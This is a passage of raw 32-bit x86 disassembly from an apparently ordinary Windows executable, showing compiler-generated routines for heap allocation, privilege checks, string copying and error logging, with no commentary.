  402d0b:	xor    ecx,ebp
  402d0d:	pop    esi
  402d0e:	call   0x407330
  402d13:	mov    esp,ebp
  402d15:	pop    ebp
  402d16:	ret    
  402d17:	int3   
  402d18:	int3   
  402d19:	int3   
  402d1a:	int3   
  402d1b:	int3   
  402d1c:	mov    edi,edi
  402d1e:	push   ebp
  402d1f:	mov    ebp,esp
  402d21:	push   ecx
  402d22:	push   ecx
  402d23:	mov    eax,ds:0x409004
  402d28:	xor    eax,ebp
  402d2a:	mov    DWORD PTR [ebp-0x4],eax
  402d2d:	push   esi
  402d2e:	push   0x32
  402d30:	pop    esi
  402d31:	lea    eax,[ebp-0x8]
  402d34:	push   eax
  402d35:	push   0x4024a8
  402d3a:	push   0x0
  402d3c:	call   DWORD PTR ds:0x40a050
  402d42:	test   eax,eax
  402d44:	jne    0x402d5b
  402d46:	lea    eax,[ebp-0x8]
  402d49:	push   eax
  402d4a:	push   0x4024f0
  402d4f:	push   0x0
  402d51:	call   DWORD PTR ds:0x40a050
  402d57:	test   eax,eax
  402d59:	je     0x402d9c
  402d5b:	push   edi
  402d5c:	push   0x402504
  402d61:	push   DWORD PTR [ebp-0x8]
  402d64:	call   0x406f48
  402d69:	mov    edi,eax
  402d6b:	test   edi,edi
  402d6d:	je     0x402d8f
  402d6f:	push   DWORD PTR [ebp+0xc]
  402d72:	mov    ecx,edi
  402d74:	push   DWORD PTR [ebp+0x8]
  402d77:	push   0x2
  402d79:	push   DWORD PTR ds:0x40902c
  402d7f:	push   DWORD PTR ds:0x409028
  402d85:	call   DWORD PTR ds:0x40a1c4
  402d8b:	call   edi
  402d8d:	mov    esi,eax
  402d8f:	push   DWORD PTR [ebp-0x8]
  402d92:	call   0x406f30
  402d97:	pop    edi
  402d98:	test   esi,esi
  402d9a:	jle    0x402da5
  402d9c:	movzx  esi,si
  402d9f:	or     esi,0x80070000
  402da5:	mov    ecx,DWORD PTR [ebp-0x4]
  402da8:	mov    eax,esi
  402daa:	xor    ecx,ebp
  402dac:	pop    esi
  402dad:	call   0x407330
  402db2:	mov    esp,ebp
  402db4:	pop    ebp
  402db5:	ret    0x8
  402db8:	int3   
  402db9:	int3   
  402dba:	int3   
  402dbb:	int3   
  402dbc:	int3   
  402dbd:	mov    edi,edi
  402dbf:	push   esi
  402dc0:	xor    esi,esi
  402dc2:	push   edi
  402dc3:	mov    edi,0x40235f
  402dc8:	test   edx,edx
  402dca:	je     0x402ddc
  402dcc:	mov    esi,edx
  402dce:	mov    edi,edx
  402dd0:	lea    edx,[esi+0x1]
  402dd3:	mov    al,BYTE PTR [esi]
  402dd5:	inc    esi
  402dd6:	test   al,al
  402dd8:	jne    0x402dd3
  402dda:	sub    esi,edx
  402ddc:	and    DWORD PTR [ecx+0x4],0x0
  402de0:	lea    eax,[esi+0x1]
  402de3:	and    DWORD PTR [ecx+0xc],0x0
  402de7:	mov    DWORD PTR [ecx],edi
  402de9:	pop    edi
  402dea:	mov    DWORD PTR [ecx+0x8],eax
  402ded:	pop    esi
  402dee:	ret    
  402def:	int3   
  402df0:	mov    edi,edi
  402df2:	push   ecx
  402df3:	call   0x40563f
  402df8:	mov    DWORD PTR ds:0x4093d0,0x403590
  402e02:	call   0x405ed8
  402e07:	push   0x407c90
  402e0c:	call   0x4073e3
  402e11:	pop    ecx
  402e12:	ret    
  402e13:	int3   
  402e14:	int3   
  402e15:	int3   
  402e16:	int3   
  402e17:	int3   
  402e18:	int3   
  402e19:	int3   
  402e1a:	int3   
  402e1b:	int3   
  402e1c:	int3   
  402e1d:	int3   
  402e1e:	int3   
  402e1f:	int3   
  402e20:	push   0x407ca0
  402e25:	call   0x4073e3
  402e2a:	pop    ecx
  402e2b:	ret    
  402e2c:	int3   
  402e2d:	int3   
  402e2e:	int3   
  402e2f:	int3   
  402e30:	push   0x407cc0
  402e35:	call   0x4073e3
  402e3a:	pop    ecx
  402e3b:	ret    
  402e3c:	int3   
  402e3d:	int3   
  402e3e:	int3   
  402e3f:	int3   
  402e40:	int3   
  402e41:	int3   
  402e42:	int3   
  402e43:	int3   
  402e44:	int3   
  402e45:	mov    edi,edi
  402e47:	push   ebp
  402e48:	mov    ebp,esp
  402e4a:	push   ecx
  402e4b:	push   ecx
  402e4c:	mov    eax,fs:0x30
  402e52:	and    DWORD PTR [ebp-0x4],0x0
  402e56:	and    DWORD PTR [ebp-0x8],0x0
  402e5a:	push   ebx
  402e5b:	push   esi
  402e5c:	push   edi
  402e5d:	push   0x44
  402e5f:	pop    edi
  402e60:	push   edi
  402e61:	push   0x8
  402e63:	push   DWORD PTR [eax+0x18]
  402e66:	xor    bl,bl
  402e68:	call   DWORD PTR ds:0x40a1b8
  402e6e:	mov    esi,eax
  402e70:	test   esi,esi
  402e72:	jne    0x402e8f
  402e74:	push   0x401110
  402e79:	push   0x48
  402e7b:	push   0x401140
  402e80:	push   0x1
  402e82:	call   0x4052c4
  402e87:	add    esp,0x10
  402e8a:	jmp    0x402f10
  402e8f:	lea    eax,[ebp-0x8]
  402e92:	mov    DWORD PTR [ebp-0x8],edi
  402e95:	push   eax
  402e96:	push   esi
  402e97:	xor    edi,edi
  402e99:	push   edi
  402e9a:	push   0xb
  402e9c:	call   DWORD PTR ds:0x40a004
  402ea2:	test   eax,eax
  402ea4:	jne    0x402ec5
  402ea6:	call   DWORD PTR ds:0x40a018
  402eac:	push   eax
  402ead:	push   0x401150
  402eb2:	push   0x53
  402eb4:	push   0x401140
  402eb9:	push   0x1
  402ebb:	call   0x4052c4
  402ec0:	add    esp,0x14
  402ec3:	jmp    0x402efe
  402ec5:	lea    eax,[ebp-0x4]
  402ec8:	push   eax
  402ec9:	push   esi
  402eca:	push   edi
  402ecb:	call   DWORD PTR ds:0x40a000
  402ed1:	test   eax,eax
  402ed3:	jne    0x402ef7
  402ed5:	call   DWORD PTR ds:0x40a018
  402edb:	push   eax
  402edc:	push   0x401178
  402ee1:	push   0x5c
  402ee3:	push   0x401140
  402ee8:	push   0x1
  402eea:	call   0x4052c4
  402eef:	add    esp,0x14
  402ef2:	mov    DWORD PTR [ebp-0x4],edi
  402ef5:	jmp    0x402efe
  402ef7:	cmp    DWORD PTR [ebp-0x4],0x1
  402efb:	sete   bl
  402efe:	mov    ecx,DWORD PTR fs:0x30
  402f05:	push   esi
  402f06:	push   edi
  402f07:	push   DWORD PTR [ecx+0x18]
  402f0a:	call   DWORD PTR ds:0x40a170
  402f10:	pop    edi
  402f11:	pop    esi
  402f12:	mov    al,bl
  402f14:	pop    ebx
  402f15:	mov    esp,ebp
  402f17:	pop    ebp
  402f18:	ret    
  402f19:	int3   
  402f1a:	int3   
  402f1b:	int3   
  402f1c:	int3   
  402f1d:	int3   
  402f1e:	int3   
  402f1f:	int3   
  402f20:	mov    edi,edi
  402f22:	push   ebp
  402f23:	mov    ebp,esp
  402f25:	push   ecx
  402f26:	push   ecx
  402f27:	and    DWORD PTR [ebp-0x4],0x0
  402f2b:	and    DWORD PTR [ebp-0x8],0x0
  402f2f:	push   ebx
  402f30:	push   esi
  402f31:	push   edi
  402f32:	xor    esi,esi
  402f34:	xor    bl,bl
  402f36:	call   DWORD PTR ds:0x40b018
  402f3c:	mov    edi,eax
  402f3e:	test   edi,edi
  402f40:	jne    0x402f67
  402f42:	call   DWORD PTR ds:0x40a018
  402f48:	push   eax
  402f49:	push   0x4011a8
  402f4e:	push   0x8c
  402f53:	push   0x4011d4
  402f58:	push   0x1
  402f5a:	call   0x4052c4
  402f5f:	add    esp,0x14
  402f62:	jmp    0x40305b
  402f67:	lea    eax,[ebp-0x4]
  402f6a:	push   eax
  402f6b:	push   0x0
  402f6d:	push   0x0
  402f6f:	push   0x2
  402f71:	push   edi
  402f72:	call   DWORD PTR ds:0x40b01c
  402f78:	test   eax,eax
  402f7a:	jne    0x40303e
  402f80:	call   DWORD PTR ds:0x40a018
  402f86:	cmp    eax,0x7a
  402f89:	je     0x402f98
  402f8b:	push   eax
  402f8c:	push   0x4011e8
  402f91:	push   0x9e
  402f96:	jmp    0x402fe7
  402f98:	push   DWORD PTR [ebp-0x4]
  402f9b:	mov    eax,fs:0x30
  402fa1:	push   0x8
  402fa3:	push   DWORD PTR [eax+0x18]
  402fa6:	call   DWORD PTR ds:0x40a1b8
  402fac:	mov    esi,eax
  402fae:	test   esi,esi
  402fb0:	jne    0x402fc1
  402fb2:	push   DWORD PTR [ebp-0x4]
  402fb5:	push   0x401210
  402fba:	push   0xa5
  402fbf:	jmp    0x402fe7
  402fc1:	lea    eax,[ebp-0x8]
  402fc4:	push   eax
  402fc5:	push   DWORD PTR [ebp-0x4]
  402fc8:	push   esi
  402fc9:	push   0x2
  402fcb:	push   edi
  402fcc:	call   DWORD PTR ds:0x40b01c
  402fd2:	test   eax,eax
  402fd4:	jne    0x402ff8
  402fd6:	call   DWORD PTR ds:0x40a018
  402fdc:	push   eax
  402fdd:	push   0x401244
  402fe2:	push   0xb3
  402fe7:	push   0x4011d4
  402fec:	push   0x1
  402fee:	call   0x4052c4
  402ff3:	add    esp,0x14
  402ff6:	jmp    0x40303e
  402ff8:	push   0x401270
  402ffd:	push   esi
  402ffe:	call   DWORD PTR ds:0x40a150
  403004:	mov    ebx,eax
  403006:	neg    ebx
  403008:	pop    ecx
  403009:	sbb    bl,bl
  40300b:	pop    ecx
  40300c:	add    bl,0x1
  40300f:	jne    0x403025
  403011:	push   esi
  403012:	push   0x401280
  403017:	push   0xbf
  40301c:	push   0x4011d4
  403021:	push   0x3
  403023:	jmp    0x402fee
  403025:	push   0x4012b8
  40302a:	push   0xc2
  40302f:	push   0x4011d4
  403034:	push   0x3
  403036:	call   0x4052c4
  40303b:	add    esp,0x10
  40303e:	push   edi
  40303f:	call   DWORD PTR ds:0x40b014
  403045:	test   esi,esi
  403047:	je     0x40305b
  403049:	mov    eax,fs:0x30
  40304f:	push   esi
  403050:	push   0x0
  403052:	push   DWORD PTR [eax+0x18]
  403055:	call   DWORD PTR ds:0x40a170
  40305b:	pop    edi
  40305c:	pop    esi
  40305d:	mov    al,bl
  40305f:	pop    ebx
  403060:	mov    esp,ebp
  403062:	pop    ebp
  403063:	ret    
  403064:	int3   
  403065:	int3   
  403066:	int3   
  403067:	int3   
  403068:	int3   
  403069:	mov    edi,edi
  40306b:	push   ebp
  40306c:	mov    ebp,esp
  40306e:	sub    esp,0x20c
  403074:	mov    eax,ds:0x409004
  403079:	xor    eax,ebp
  40307b:	mov    DWORD PTR [ebp-0x4],eax
  40307e:	push   esi
  40307f:	push   edi
  403080:	mov    edi,0x104
  403085:	lea    eax,[ebp-0x20c]
  40308b:	push   edi
  40308c:	push   eax
  40308d:	xor    esi,esi
  40308f:	call   DWORD PTR ds:0x40a044
  403095:	cmp    eax,edi
  403097:	ja     0x4030c2
  403099:	test   eax,eax
  40309b:	je     0x4030c2
  40309d:	push   0x4012f8
  4030a2:	lea    eax,[ebp-0x20c]
  4030a8:	push   eax
  4030a9:	call   DWORD PTR ds:0x40b008
  4030af:	test   eax,eax
  4030b1:	je     0x4030c2
  4030b3:	lea    eax,[ebp-0x20c]
  4030b9:	push   eax
  4030ba:	call   DWORD PTR ds:0x40a02c
  4030c0:	mov    esi,eax
  4030c2:	mov    ecx,DWORD PTR [ebp-0x4]
  4030c5:	mov    eax,esi
  4030c7:	pop    edi
  4030c8:	xor    ecx,ebp
  4030ca:	pop    esi
  4030cb:	call   0x407330
  4030d0:	mov    esp,ebp
  4030d2:	pop    ebp
  4030d3:	ret    
  4030d4:	int3   
  4030d5:	int3   
  4030d6:	int3   
  4030d7:	int3   
  4030d8:	int3   
  4030d9:	mov    edi,edi
  4030db:	push   ebp
  4030dc:	mov    ebp,esp
  4030de:	sub    esp,0x1c
  4030e1:	push   edi
  4030e2:	mov    eax,ecx
  4030e4:	mov    DWORD PTR [ebp-0x1c],edx
  4030e7:	xor    edi,edi
  4030e9:	mov    DWORD PTR [ebp-0xc],eax
  4030ec:	test   edx,edx
  4030ee:	je     0x403293
  4030f4:	push   ebx
  4030f5:	lea    edx,[eax+0x8]
  4030f8:	mov    DWORD PTR [ebp-0x10],0x20
  4030ff:	lea    ecx,[eax+0x6]
  403102:	mov    DWORD PTR [ebp-0x8],edx
  403105:	push   esi
  403106:	mov    DWORD PTR [ebp-0x4],ecx
  403109:	lea    ebx,[eax+0x4]
  40310c:	lea    esi,[eax+0x2]
  40310f:	mov    DWORD PTR [ebp-0x14],0xa
  403116:	push   0x3c
  403118:	pop    edx
  403119:	cmp    dx,WORD PTR [eax+edi*2]
  40311d:	mov    edx,DWORD PTR [ebp-0x8]
  403120:	jne    0x403275
  403126:	mov    eax,DWORD PTR [ebp-0x1c]
  403129:	sub    eax,edi
  40312b:	dec    eax
  40312c:	mov    DWORD PTR [ebp-0x18],eax
  40312f:	cmp    eax,0x2
  403132:	jb     0x40317a
  403134:	push   0x2
  403136:	push   0x40130c
  40313b:	push   esi
  40313c:	call   DWORD PTR ds:0x40a14c
  403142:	add    esp,0xc
  403145:	test   eax,eax
  403147:	jne    0x403177
  403149:	mov    eax,DWORD PTR [ebp-0xc]
  40314c:	mov    ecx,DWORD PTR [ebp-0x10]
  40314f:	push   0xd
  403151:	mov    WORD PTR [eax+edi*2],cx
  403155:	add    edi,0x3
  403158:	mov    ecx,DWORD PTR [ebp-0x14]
  40315b:	mov    WORD PTR [esi],cx
  40315e:	add    esi,0x6
  403161:	pop    ecx
  403162:	mov    WORD PTR [ebx],cx
  403165:	add    ebx,0x6
  403168:	mov    ecx,DWORD PTR [ebp-0x4]
  40316b:	add    ecx,0x6
  40316e:	add    DWORD PTR [ebp-0x8],0x6
  403172:	jmp    0x403285
  403177:	mov    eax,DWORD PTR [ebp-0x18]
  40317a:	cmp    eax,0x3
  40317d:	jb     0x4031f2
  40317f:	push   0x3
  403181:	push   0x401314
  403186:	push   esi
  403187:	call   DWORD PTR ds:0x40a14c
  40318d:	add    esp,0xc
  403190:	test   eax,eax
  403192:	je     0x4031be
  403194:	push   0x3
  403196:	push   0x40131c
  40319b:	push   esi
  40319c:	call   DWORD PTR ds:0x40a14c
  4031a2:	add    esp,0xc
  4031a5:	test   eax,eax
  4031a7:	je     0x4031be
  4031a9:	push   0x3
  4031ab:	push   0x401324
  4031b0:	push   esi
  4031b1:	call   DWORD PTR ds:0x40a14c
  4031b7:	add    esp,0xc
  4031ba:	test   eax,eax
  4031bc:	jne    0x4031ef
  4031be:	mov    eax,DWORD PTR [ebp-0xc]
  4031c1:	mov    ecx,DWORD PTR [ebp-0x10]
  4031c4:	mov    WORD PTR [esi],cx
  4031c7:	add    esi,0x8
  4031ca:	push   0xd
  4031cc:	mov    WORD PTR [eax+edi*2],cx
  4031d0:	add    edi,0x4
  4031d3:	mov    ecx,DWORD PTR [ebp-0x14]
  4031d6:	mov    WORD PTR [ebx],cx
  4031d9:	add    ebx,0x8
  4031dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4031df:	pop    edx
  4031e0:	mov    WORD PTR [ecx],dx
  4031e3:	add    ecx,0x8
  4031e6:	add    DWORD PTR [ebp-0x8],0x8
  4031ea:	jmp    0x403285
  4031ef:	mov    eax,DWORD PTR [ebp-0x18]
  4031f2:	cmp    eax,0x4
  4031f5:	jb     0x40326c
  4031f7:	push   0x4
  4031f9:	push   0x40132c
  4031fe:	push   esi
  4031ff:	call   DWORD PTR ds:0x40a14c
  403205:	add    esp,0xc
  403208:	test   eax,eax
  40320a:	je     0x403236
  40320c:	push   0x4
  40320e:	push   0x401338
  403213:	push   esi
  403214:	call   DWORD PTR ds:0x40a14c
  40321a:	add    esp,0xc
  40321d:	test   eax,eax
  40321f:	je     0x403236
  403221:	push   0x4
  403223:	push   0x401344
  403228:	push   esi
  403229:	call   DWORD PTR ds:0x40a14c
  40322f:	add    esp,0xc
  403232:	test   eax,eax
  403234:	jne    0x40326c
  403236:	mov    eax,DWORD PTR [ebp-0xc]
  403239:	mov    ecx,DWORD PTR [ebp-0x10]
  40323c:	mov    edx,DWORD PTR [ebp-0x14]
  40323f:	mov    WORD PTR [esi],cx
  403242:	add    esi,0xa
  403245:	mov    WORD PTR [eax+edi*2],cx
  403249:	add    edi,0x5
  40324c:	mov    WORD PTR [ebx],cx
  40324f:	add    ebx,0xa
  403252:	mov    ecx,DWORD PTR [ebp-0x4]
  403255:	push   0xd
  403257:	pop    eax
  403258:	mov    WORD PTR [ecx],dx
  40325b:	add    ecx,0xa
  40325e:	mov    edx,DWORD PTR [ebp-0x8]
  403261:	mov    WORD PTR [edx],ax
  403264:	add    edx,0xa
  403267:	mov    eax,DWORD PTR [ebp-0xc]
  40326a:	jmp    0x403282
  40326c:	mov    edx,DWORD PTR [ebp-0x8]
  40326f:	mov    ecx,DWORD PTR [ebp-0x4]
  403272:	mov    eax,DWORD PTR [ebp-0xc]
  403275:	inc    edi
  403276:	add    esi,0x2
  403279:	add    ebx,0x2
  40327c:	add    ecx,0x2
  40327f:	add    edx,0x2
  403282:	mov    DWORD PTR [ebp-0x8],edx
  403285:	mov    DWORD PTR [ebp-0x4],ecx
  403288:	cmp    edi,DWORD PTR [ebp-0x1c]
  40328b:	jb     0x403116
  403291:	pop    esi
  403292:	pop    ebx
  403293:	pop    edi
  403294:	mov    esp,ebp
  403296:	pop    ebp
  403297:	ret    
  403298:	int3   
  403299:	int3   
  40329a:	int3   
  40329b:	int3   
  40329c:	int3   
  40329d:	mov    edi,edi
  40329f:	push   ebp
  4032a0:	mov    ebp,esp
  4032a2:	sub    esp,0x28
  4032a5:	mov    eax,ds:0x409004
  4032aa:	xor    eax,ebp
  4032ac:	mov    DWORD PTR [ebp-0x4],eax
  4032af:	push   ebx
  4032b0:	push   esi
  4032b1:	push   edi
  4032b2:	mov    edi,ecx
  4032b4:	xor    eax,eax
  4032b6:	mov    DWORD PTR [ebp-0x14],eax
  4032b9:	xor    esi,esi
  4032bb:	mov    DWORD PTR [ebp-0x8],eax
  4032be:	inc    esi
  4032bf:	mov    DWORD PTR [ebp-0x10],eax
  4032c2:	lea    eax,[ebp-0x20]
  4032c5:	lea    ebx,[edi+0x208]
  4032cb:	push   ebx
  4032cc:	push   eax
  4032cd:	call   DWORD PTR ds:0x40a174
  4032d3:	lea    eax,[edi+0x308]
  4032d9:	push   eax
  4032da:	lea    eax,[ebp-0x20]
  4032dd:	push   eax
  4032de:	call   DWORD PTR ds:0x40a178
  4032e4:	test   eax,eax
  4032e6:	jns    0x403307
  4032e8:	push   ebx
  4032e9:	push   eax
  4032ea:	push   0x401350
  4032ef:	push   0x185
  4032f4:	push   0x401378
  4032f9:	push   esi
  4032fa:	call   0x4052c4
  4032ff:	add    esp,0x18
  403302:	jmp    0x4034a8
  403307:	lea    eax,[edi+0x288]
  40330d:	push   eax
  40330e:	mov    DWORD PTR [ebp-0xc],eax
  403311:	lea    eax,[ebp-0x28]
  403314:	push   eax
  403315:	call   DWORD PTR ds:0x40a174
  40331b:	lea    ebx,[edi+0x318]
  403321:	push   ebx
  403322:	lea    eax,[ebp-0x28]
  403325:	mov    DWORD PTR [ebp-0x18],ebx
  403328:	push   eax
  403329:	call   DWORD PTR ds:0x40a178
  40332f:	test   eax,eax
  403331:	jns    0x403343
  403333:	push   DWORD PTR [ebp-0xc]
  403336:	push   eax
  403337:	push   0x401350
  40333c:	push   0x18d
  403341:	jmp    0x4032f4
  403343:	push   ebx
  403344:	call   DWORD PTR ds:0x40a0e0
  40334a:	test   eax,eax
  40334c:	jne    0x403362
  40334e:	lea    eax,[ebp-0x8]
  403351:	push   eax
  403352:	push   ebx
  403353:	call   DWORD PTR ds:0x40a0d8
  403359:	test   eax,eax
  40335b:	je     0x403362
  40335d:	mov    ebx,DWORD PTR [ebp-0x8]
  403360:	jmp    0x403369
  403362:	xor    eax,eax
  403364:	mov    ebx,eax
  403366:	mov    DWORD PTR [ebp-0x8],ebx
  403369:	test   bl,0x2
  40336c:	je     0x40338d
  40336e:	push   edi
  40336f:	push   0x40138c
  403374:	push   0x19f
  403379:	push   0x401378
  40337e:	push   0x3
  403380:	call   0x4052c4
  403385:	add    esp,0x14
  403388:	jmp    0x4034a8
  40338d:	shr    ebx,0x2
  403390:	not    ebx
  403392:	and    ebx,esi
  403394:	je     0x4033ac
  403396:	call   0x402f20
  40339b:	test   al,al
  40339d:	je     0x4033a8
  40339f:	call   0x402e45
  4033a4:	test   al,al
  4033a6:	jne    0x4033ce
  4033a8:	xor    eax,eax
  4033aa:	mov    ebx,eax
  4033ac:	push   edi
  4033ad:	push   0x4013a8
  4033b2:	push   0x1b0
  4033b7:	push   0x401378
  4033bc:	push   0x3
  4033be:	call   0x4052c4
  4033c3:	add    esp,0x14
  4033c6:	test   ebx,ebx
  4033c8:	je     0x40349a
  4033ce:	call   0x403069
  4033d3:	mov    DWORD PTR [ebp-0x10],eax
  4033d6:	test   eax,eax
  4033d8:	jne    0x4033f7
  4033da:	push   0x4013c4
  4033df:	push   0x1c2
  4033e4:	push   0x401378
  4033e9:	push   esi
  4033ea:	call   0x4052c4
  4033ef:	add    esp,0x10
  4033f2:	jmp    0x4034a8
  4033f7:	push   0x4013f4
  4033fc:	push   eax
  4033fd:	call   DWORD PTR ds:0x40a01c
  403403:	mov    ebx,eax
  403405:	test   ebx,ebx
  403407:	jne    0x403423
  403409:	push   0x4013c4
  40340e:	push   0x1cb
  403413:	push   0x401378
  403418:	push   esi
  403419:	call   0x4052c4
  40341e:	add    esp,0x10
  403421:	jmp    0x40349a
  403423:	mov    ecx,DWORD PTR [edi+0x330]
  403429:	mov    edx,ecx
  40342b:	lea    eax,[edx+0x2]
  40342e:	mov    DWORD PTR [ebp-0xc],eax
  403431:	mov    ax,WORD PTR [edx]
  403434:	add    edx,0x2
  403437:	cmp    ax,WORD PTR [ebp-0x14]
  40343b:	jne    0x403431
  40343d:	sub    edx,DWORD PTR [ebp-0xc]
  403440:	sar    edx,1
  403442:	inc    edx
  403443:	call   0x4030d9
  403448:	call   DWORD PTR ds:0x40a020
  40344e:	push   edi
  40344f:	mov    ecx,ebx
  403451:	call   DWORD PTR ds:0x40a1c4
  403457:	call   ebx
  403459:	mov    ebx,eax
  40345b:	call   DWORD PTR ds:0x40a020
  403461:	cmp    ebx,0xffffffff
  403464:	je     0x40348d
  403466:	test   bl,0x8
  403469:	je     0x403487
  40346b:	mov    edi,DWORD PTR [ebp-0x18]
  40346e:	or     DWORD PTR [ebp-0x8],0x4
  403472:	push   edi
  403473:	call   DWORD PTR ds:0x40a0e0
  403479:	test   eax,eax
  40347b:	jne    0x403487
  40347d:	push   DWORD PTR [ebp-0x8]
  403480:	push   edi
  403481:	call   DWORD PTR ds:0x40a0d4
  403487:	shr    ebx,1
  403489:	and    esi,ebx
  40348b:	jmp    0x40349a
  40348d:	xor    eax,eax
  40348f:	cmp    DWORD PTR [edi+0x33c],esi
  403495:	setne  al
  403498:	mov    esi,eax
  40349a:	mov    eax,DWORD PTR [ebp-0x10]
  40349d:	test   eax,eax
  40349f:	je     0x4034a8
  4034a1:	push   eax
  4034a2:	call   DWORD PTR ds:0x40a048
  4034a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4034ab:	xor    eax,eax
  4034ad:	test   esi,esi
  4034af:	pop    edi
  4034b0:	setne  al
  4034b3:	xor    ecx,ebp
  4034b5:	pop    esi
  4034b6:	pop    ebx
  4034b7:	call   0x407330
  4034bc:	mov    esp,ebp
  4034be:	pop    ebp
  4034bf:	ret    
  4034c0:	int3   
  4034c1:	int3   
  4034c2:	int3   
  4034c3:	int3   
  4034c4:	int3   
  4034c5:	mov    edi,edi
  4034c7:	push   ebp
  4034c8:	mov    ebp,esp
  4034ca:	xor    eax,eax
  4034cc:	test   edx,edx
  4034ce:	je     0x4034d8
  4034d0:	cmp    edx,0x7fffffff
  4034d6:	jbe    0x4034dd
  4034d8:	mov    eax,0x80070057
  4034dd:	test   eax,eax
  4034df:	js     0x4034ed
  4034e1:	push   ecx
  4034e2:	push   DWORD PTR [ebp+0x8]
  4034e5:	push   ecx
  4034e6:	call   0x40353a
  4034eb:	jmp    0x4034f6
  4034ed:	test   edx,edx
  4034ef:	je     0x4034f6
  4034f1:	xor    edx,edx
  4034f3:	mov    WORD PTR [ecx],dx
  4034f6:	pop    ebp
  4034f7:	ret    0x4
  4034fa:	int3   
  4034fb:	int3   
  4034fc:	int3   
  4034fd:	int3   
  4034fe:	int3   
  4034ff:	mov    edi,edi
  403501:	push   ebp
  403502:	mov    ebp,esp
  403504:	shr    edx,1
  403506:	push   0x0
  403508:	pop    eax
  403509:	je     0x403513
  40350b:	cmp    edx,0x7fffffff
  403511:	jbe    0x403518
  403513:	mov    eax,0x80070057
  403518:	test   eax,eax
  40351a:	js     0x403528
  40351c:	push   ecx
  40351d:	push   DWORD PTR [ebp+0x8]
  403520:	push   ecx
  403521:	call   0x40353a
  403526:	jmp    0x403531
  403528:	test   edx,edx
  40352a:	je     0x403531
  40352c:	xor    edx,edx
  40352e:	mov    WORD PTR [ecx],dx
  403531:	pop    ebp
  403532:	ret    0x4
  403535:	int3   
  403536:	int3   
  403537:	int3   
  403538:	int3   
  403539:	int3   
  40353a:	mov    edi,edi
  40353c:	push   ebp
  40353d:	mov    ebp,esp
  40353f:	push   edi
  403540:	xor    edi,edi
  403542:	test   edx,edx
  403544:	je     0x403571
  403546:	mov    eax,DWORD PTR [ebp+0xc]
  403549:	push   ebx
  40354a:	push   esi
  40354b:	mov    esi,0x7ffffffe
  403550:	sub    eax,ecx
  403552:	test   esi,esi
  403554:	je     0x40356b
  403556:	movzx  ebx,WORD PTR [eax+ecx*1]
  40355a:	test   bx,bx
  40355d:	je     0x40356b
  40355f:	mov    WORD PTR [ecx],bx
  403562:	add    ecx,0x2
  403565:	dec    esi
  403566:	sub    edx,0x1
  403569:	jne    0x403552
  40356b:	pop    esi
  40356c:	pop    ebx
  40356d:	test   edx,edx
  40356f:	jne    0x403579
  403571:	sub    ecx,0x2
  403574:	mov    edi,0x8007007a
  403579:	xor    eax,eax
  40357b:	mov    WORD PTR [ecx],ax
  40357e:	mov    eax,edi
  403580:	pop    edi
  403581:	pop    ebp
  403582:	ret    0xc
  403585:	int3   
  403586:	int3   
  403587:	int3   
  403588:	int3   
  403589:	int3   
  40358a:	int3   
  40358b:	int3   
  40358c:	int3   
  40358d:	int3   
  40358e:	int3   
  40358f:	int3   
  403590:	mov    edi,edi
  403592:	push   ebp
  403593:	mov    ebp,esp
  403595:	push   ecx
  403596:	mov    eax,ds:0x409004
  40359b:	xor    eax,ebp
  40359d:	mov    DWORD PTR [ebp-0x4],eax
  4035a0:	push   DWORD PTR [ebp+0x18]
  4035a3:	mov    edx,DWORD PTR [ebp+0x8]
  4035a6:	push   DWORD PTR [ebp+0x14]
  4035a9:	mov    ecx,DWORD PTR ds:0x4093a4
  4035af:	push   DWORD PTR [ebp+0x10]
  4035b2:	push   DWORD PTR [ebp+0xc]
  4035b5:	call   0x405ae0
  4035ba:	cmp    DWORD PTR [ebp+0x8],0x1
  4035be:	jne    0x4035d7
  4035c0:	push   DWORD PTR [ebp+0x18]
  4035c3:	mov    edx,DWORD PTR [ebp+0xc]
  4035c6:	push   DWORD PTR [ebp+0x14]
  4035c9:	mov    ecx,DWORD PTR ds:0x4093a8
  4035cf:	push   DWORD PTR [ebp+0x10]
  4035d2:	call   0x406910
  4035d7:	push   esi
  4035d8:	mov    esi,DWORD PTR ds:0x40939c
  4035de:	test   esi,esi
  4035e0:	je     0x4035fb
  4035e2:	push   DWORD PTR [ebp+0x18]
  4035e5:	mov    ecx,esi
  4035e7:	push   DWORD PTR [ebp+0x14]
  4035ea:	push   DWORD PTR [ebp+0x10]
  4035ed:	push   DWORD PTR [ebp+0xc]
  4035f0:	push   DWORD PTR [ebp+0x8]
  4035f3:	call   DWORD PTR ds:0x40a1c4
  4035f9:	call   esi
  4035fb:	mov    ecx,DWORD PTR [ebp-0x4]
  4035fe:	xor    ecx,ebp
  403600:	pop    esi
  403601:	call   0x407330
  403606:	mov    esp,ebp
  403608:	pop    ebp
  403609:	ret    0x14
  40360c:	int3   
  40360d:	int3   
  40360e:	int3   
  40360f:	int3   
  403610:	int3   
  403611:	mov    edi,edi
  403613:	push   ebp
  403614:	mov    ebp,esp
  403616:	push   ecx
  403617:	push   ecx
  403618:	push   ebx
  403619:	push   esi
  40361a:	push   edi
  40361b:	mov    edi,ecx
  40361d:	mov    DWORD PTR [ebp-0x8],edx
  403620:	xor    ebx,ebx
  403622:	mov    esi,ebx
  403624:	test   edi,edi
  403626:	je     0x403644
  403628:	mov    esi,0x7fff
  40362d:	mov    eax,ebx
  40362f:	mov    edx,esi
  403631:	cmp    WORD PTR [ecx],bx
  403634:	je     0x40363e
  403636:	add    ecx,0x2
  403639:	sub    edx,0x1
  40363c:	jne    0x403631
  40363e:	test   edx,edx
  403640:	jne    0x403669
  403642:	mov    esi,ebx
  403644:	mov    eax,0x80070057
  403649:	test   eax,eax
  40364b:	jns    0x40366d
  40364d:	movzx  eax,ax
  403650:	push   eax
  403651:	push   0x401528
  403656:	push   0x49
  403658:	push   0x401554
  40365d:	push   0x1
  40365f:	call   0x4052c4
  403664:	add    esp,0x14
  403667:	jmp    0x4036e6
  403669:	sub    esi,edx
  40366b:	jmp    0x403649
  40366d:	lea    eax,[esi*2+0x2]
  403674:	push   eax
  403675:	mov    DWORD PTR [ebp-0x4],eax
  403678:	mov    eax,fs:0x30
  40367e:	push   0x8
  403680:	push   DWORD PTR [eax+0x18]
  403683:	call   DWORD PTR ds:0x40a1b8
  403689:	mov    esi,eax
  40368b:	test   esi,esi
  40368d:	jne    0x4036a7
  40368f:	push   0x401564
  403694:	push   0x53
  403696:	push   0x401554
  40369b:	push   0x1
  40369d:	call   0x4052c4
